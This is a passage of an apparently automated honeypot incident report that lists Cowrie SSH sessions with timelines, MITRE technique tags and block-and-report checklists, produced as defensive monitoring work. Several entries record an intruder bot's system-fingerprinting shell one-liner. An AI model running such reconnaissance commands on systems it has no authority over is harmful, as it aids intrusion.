| `2026-07-06 03:52:44` | `cowrie.log.closed` |
| `2026-07-06 03:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04d3bab4affb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 03:52 |
| **Last Seen** | 2026-07-06 03:52 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:52:40` | `cowrie.session.connect` |
| `2026-07-06 03:52:41` | `cowrie.client.version` |
| `2026-07-06 03:52:41` | `cowrie.client.kex` |
| `2026-07-06 03:52:48` | `cowrie.login.success` |
| `2026-07-06 03:52:52` | `cowrie.session.params` |
| `2026-07-06 03:52:52` | `cowrie.command.input` |
| `2026-07-06 03:52:53` | `cowrie.log.closed` |
| `2026-07-06 03:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aca85d29df3b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:53 |
| **Last Seen** | 2026-07-06 03:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:53:35` | `cowrie.session.connect` |
| `2026-07-06 03:53:36` | `cowrie.client.version` |
| `2026-07-06 03:53:36` | `cowrie.client.kex` |
| `2026-07-06 03:53:38` | `cowrie.login.success` |
| `2026-07-06 03:53:40` | `cowrie.session.params` |
| `2026-07-06 03:53:40` | `cowrie.command.input` |
| `2026-07-06 03:53:40` | `cowrie.command.input` |
| `2026-07-06 03:53:40` | `cowrie.command.input` |
| `2026-07-06 03:53:40` | `cowrie.command.input` |
| `2026-07-06 03:53:40` | `cowrie.command.input` |
| `2026-07-06 03:53:40` | `cowrie.command.success` |
| `2026-07-06 03:53:40` | `cowrie.command.input` |
| `2026-07-06 03:53:40` | `cowrie.command.input` |
| `2026-07-06 03:53:40` | `cowrie.command.input` |
| `2026-07-06 03:53:40` | `cowrie.command.input` |
| `2026-07-06 03:53:40` | `cowrie.log.closed` |
| `2026-07-06 03:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1418677fc5e6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:54 |
| **Last Seen** | 2026-07-06 03:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:54:31` | `cowrie.session.connect` |
| `2026-07-06 03:54:32` | `cowrie.client.version` |
| `2026-07-06 03:54:32` | `cowrie.client.kex` |
| `2026-07-06 03:54:34` | `cowrie.login.success` |
| `2026-07-06 03:54:36` | `cowrie.session.params` |
| `2026-07-06 03:54:36` | `cowrie.command.input` |
| `2026-07-06 03:54:36` | `cowrie.command.input` |
| `2026-07-06 03:54:36` | `cowrie.command.input` |
| `2026-07-06 03:54:36` | `cowrie.command.input` |
| `2026-07-06 03:54:36` | `cowrie.command.input` |
| `2026-07-06 03:54:36` | `cowrie.command.success` |
| `2026-07-06 03:54:36` | `cowrie.command.input` |
| `2026-07-06 03:54:36` | `cowrie.command.input` |
| `2026-07-06 03:54:36` | `cowrie.command.input` |
| `2026-07-06 03:54:36` | `cowrie.command.input` |
| `2026-07-06 03:54:36` | `cowrie.log.closed` |
| `2026-07-06 03:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49b59a94b8e0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:55 |
| **Last Seen** | 2026-07-06 03:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:55:27` | `cowrie.session.connect` |
| `2026-07-06 03:55:28` | `cowrie.client.version` |
| `2026-07-06 03:55:28` | `cowrie.client.kex` |
| `2026-07-06 03:55:30` | `cowrie.login.success` |
| `2026-07-06 03:55:31` | `cowrie.session.params` |
| `2026-07-06 03:55:31` | `cowrie.command.input` |
| `2026-07-06 03:55:31` | `cowrie.command.input` |
| `2026-07-06 03:55:31` | `cowrie.command.input` |
| `2026-07-06 03:55:31` | `cowrie.command.input` |
| `2026-07-06 03:55:31` | `cowrie.command.input` |
| `2026-07-06 03:55:31` | `cowrie.command.success` |
| `2026-07-06 03:55:31` | `cowrie.command.input` |
| `2026-07-06 03:55:31` | `cowrie.command.input` |
| `2026-07-06 03:55:31` | `cowrie.command.input` |
| `2026-07-06 03:55:31` | `cowrie.command.input` |
| `2026-07-06 03:55:32` | `cowrie.log.closed` |
| `2026-07-06 03:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f293cdf61365

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:56 |
| **Last Seen** | 2026-07-06 03:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:56:22` | `cowrie.session.connect` |
| `2026-07-06 03:56:23` | `cowrie.client.version` |
| `2026-07-06 03:56:23` | `cowrie.client.kex` |
| `2026-07-06 03:56:25` | `cowrie.login.success` |
| `2026-07-06 03:56:27` | `cowrie.session.params` |
| `2026-07-06 03:56:27` | `cowrie.command.input` |
| `2026-07-06 03:56:27` | `cowrie.command.input` |
| `2026-07-06 03:56:27` | `cowrie.command.input` |
| `2026-07-06 03:56:27` | `cowrie.command.input` |
| `2026-07-06 03:56:27` | `cowrie.command.input` |
| `2026-07-06 03:56:27` | `cowrie.command.success` |
| `2026-07-06 03:56:27` | `cowrie.command.input` |
| `2026-07-06 03:56:27` | `cowrie.command.input` |
| `2026-07-06 03:56:27` | `cowrie.command.input` |
| `2026-07-06 03:56:27` | `cowrie.command.input` |
| `2026-07-06 03:56:27` | `cowrie.log.closed` |
| `2026-07-06 03:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-699c583baf90

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:57 |
| **Last Seen** | 2026-07-06 03:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:57:17` | `cowrie.session.connect` |
| `2026-07-06 03:57:18` | `cowrie.client.version` |
| `2026-07-06 03:57:18` | `cowrie.client.kex` |
| `2026-07-06 03:57:20` | `cowrie.login.success` |
| `2026-07-06 03:57:22` | `cowrie.session.params` |
| `2026-07-06 03:57:22` | `cowrie.command.input` |
| `2026-07-06 03:57:22` | `cowrie.command.input` |
| `2026-07-06 03:57:22` | `cowrie.command.input` |
| `2026-07-06 03:57:22` | `cowrie.command.input` |
| `2026-07-06 03:57:22` | `cowrie.command.input` |
| `2026-07-06 03:57:22` | `cowrie.command.success` |
| `2026-07-06 03:57:22` | `cowrie.command.input` |
| `2026-07-06 03:57:22` | `cowrie.command.input` |
| `2026-07-06 03:57:22` | `cowrie.command.input` |
| `2026-07-06 03:57:22` | `cowrie.command.input` |
| `2026-07-06 03:57:22` | `cowrie.log.closed` |
| `2026-07-06 03:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2bcbd0893fe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:58 |
| **Last Seen** | 2026-07-06 03:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:58:12` | `cowrie.session.connect` |
| `2026-07-06 03:58:13` | `cowrie.client.version` |
| `2026-07-06 03:58:13` | `cowrie.client.kex` |
| `2026-07-06 03:58:14` | `cowrie.login.success` |
| `2026-07-06 03:58:16` | `cowrie.session.params` |
| `2026-07-06 03:58:16` | `cowrie.command.input` |
| `2026-07-06 03:58:16` | `cowrie.command.input` |
| `2026-07-06 03:58:16` | `cowrie.command.input` |
| `2026-07-06 03:58:16` | `cowrie.command.input` |
| `2026-07-06 03:58:16` | `cowrie.command.input` |
| `2026-07-06 03:58:16` | `cowrie.command.success` |
| `2026-07-06 03:58:16` | `cowrie.command.input` |
| `2026-07-06 03:58:16` | `cowrie.command.input` |
| `2026-07-06 03:58:16` | `cowrie.command.input` |
| `2026-07-06 03:58:16` | `cowrie.command.input` |
| `2026-07-06 03:58:16` | `cowrie.log.closed` |
| `2026-07-06 03:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08e249470d1d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:59 |
| **Last Seen** | 2026-07-06 03:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:59:06` | `cowrie.session.connect` |
| `2026-07-06 03:59:07` | `cowrie.client.version` |
| `2026-07-06 03:59:07` | `cowrie.client.kex` |
| `2026-07-06 03:59:10` | `cowrie.login.success` |
| `2026-07-06 03:59:12` | `cowrie.session.params` |
| `2026-07-06 03:59:12` | `cowrie.command.input` |
| `2026-07-06 03:59:12` | `cowrie.command.input` |
| `2026-07-06 03:59:12` | `cowrie.command.input` |
| `2026-07-06 03:59:12` | `cowrie.command.input` |
| `2026-07-06 03:59:12` | `cowrie.command.input` |
| `2026-07-06 03:59:12` | `cowrie.command.success` |
| `2026-07-06 03:59:12` | `cowrie.command.input` |
| `2026-07-06 03:59:12` | `cowrie.command.input` |
| `2026-07-06 03:59:12` | `cowrie.command.input` |
| `2026-07-06 03:59:12` | `cowrie.command.input` |
| `2026-07-06 03:59:12` | `cowrie.log.closed` |
| `2026-07-06 03:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-671301511067

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:00 |
| **Last Seen** | 2026-07-06 04:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:00:01` | `cowrie.session.connect` |
| `2026-07-06 04:00:02` | `cowrie.client.version` |
| `2026-07-06 04:00:02` | `cowrie.client.kex` |
| `2026-07-06 04:00:03` | `cowrie.login.success` |
| `2026-07-06 04:00:05` | `cowrie.session.params` |
| `2026-07-06 04:00:05` | `cowrie.command.input` |
| `2026-07-06 04:00:05` | `cowrie.command.input` |
| `2026-07-06 04:00:05` | `cowrie.command.input` |
| `2026-07-06 04:00:05` | `cowrie.command.input` |
| `2026-07-06 04:00:05` | `cowrie.command.input` |
| `2026-07-06 04:00:05` | `cowrie.command.success` |
| `2026-07-06 04:00:05` | `cowrie.command.input` |
| `2026-07-06 04:00:05` | `cowrie.command.input` |
| `2026-07-06 04:00:05` | `cowrie.command.input` |
| `2026-07-06 04:00:05` | `cowrie.command.input` |
| `2026-07-06 04:00:06` | `cowrie.log.closed` |
| `2026-07-06 04:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efabebf19869

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:00 |
| **Last Seen** | 2026-07-06 04:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:00:56` | `cowrie.session.connect` |
| `2026-07-06 04:00:56` | `cowrie.client.version` |
| `2026-07-06 04:00:56` | `cowrie.client.kex` |
| `2026-07-06 04:00:58` | `cowrie.login.success` |
| `2026-07-06 04:01:00` | `cowrie.session.params` |
| `2026-07-06 04:01:00` | `cowrie.command.input` |
| `2026-07-06 04:01:00` | `cowrie.command.input` |
| `2026-07-06 04:01:00` | `cowrie.command.input` |
| `2026-07-06 04:01:00` | `cowrie.command.input` |
| `2026-07-06 04:01:00` | `cowrie.command.input` |
| `2026-07-06 04:01:00` | `cowrie.command.success` |
| `2026-07-06 04:01:00` | `cowrie.command.input` |
| `2026-07-06 04:01:00` | `cowrie.command.input` |
| `2026-07-06 04:01:00` | `cowrie.command.input` |
| `2026-07-06 04:01:00` | `cowrie.command.input` |
| `2026-07-06 04:01:01` | `cowrie.log.closed` |
| `2026-07-06 04:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b14cb3b548d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:01 |
| **Last Seen** | 2026-07-06 04:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:01:50` | `cowrie.session.connect` |
| `2026-07-06 04:01:51` | `cowrie.client.version` |
| `2026-07-06 04:01:51` | `cowrie.client.kex` |
| `2026-07-06 04:01:53` | `cowrie.login.success` |
| `2026-07-06 04:01:55` | `cowrie.session.params` |
| `2026-07-06 04:01:55` | `cowrie.command.input` |
| `2026-07-06 04:01:55` | `cowrie.command.input` |
| `2026-07-06 04:01:55` | `cowrie.command.input` |
| `2026-07-06 04:01:55` | `cowrie.command.input` |
| `2026-07-06 04:01:55` | `cowrie.command.input` |
| `2026-07-06 04:01:55` | `cowrie.command.success` |
| `2026-07-06 04:01:55` | `cowrie.command.input` |
| `2026-07-06 04:01:55` | `cowrie.command.input` |
| `2026-07-06 04:01:55` | `cowrie.command.input` |
| `2026-07-06 04:01:55` | `cowrie.command.input` |
| `2026-07-06 04:01:55` | `cowrie.log.closed` |
| `2026-07-06 04:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d80de8a14c6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:02 |
| **Last Seen** | 2026-07-06 04:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:02:45` | `cowrie.session.connect` |
| `2026-07-06 04:02:45` | `cowrie.client.version` |
| `2026-07-06 04:02:45` | `cowrie.client.kex` |
| `2026-07-06 04:02:48` | `cowrie.login.success` |
| `2026-07-06 04:02:50` | `cowrie.session.params` |
| `2026-07-06 04:02:50` | `cowrie.command.input` |
| `2026-07-06 04:02:50` | `cowrie.command.input` |
| `2026-07-06 04:02:50` | `cowrie.command.input` |
| `2026-07-06 04:02:50` | `cowrie.command.input` |
| `2026-07-06 04:02:50` | `cowrie.command.input` |
| `2026-07-06 04:02:50` | `cowrie.command.success` |
| `2026-07-06 04:02:50` | `cowrie.command.input` |
| `2026-07-06 04:02:50` | `cowrie.command.input` |
| `2026-07-06 04:02:50` | `cowrie.command.input` |
| `2026-07-06 04:02:50` | `cowrie.command.input` |
| `2026-07-06 04:02:50` | `cowrie.log.closed` |
| `2026-07-06 04:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a477290b0d0f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:03 |
| **Last Seen** | 2026-07-06 04:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

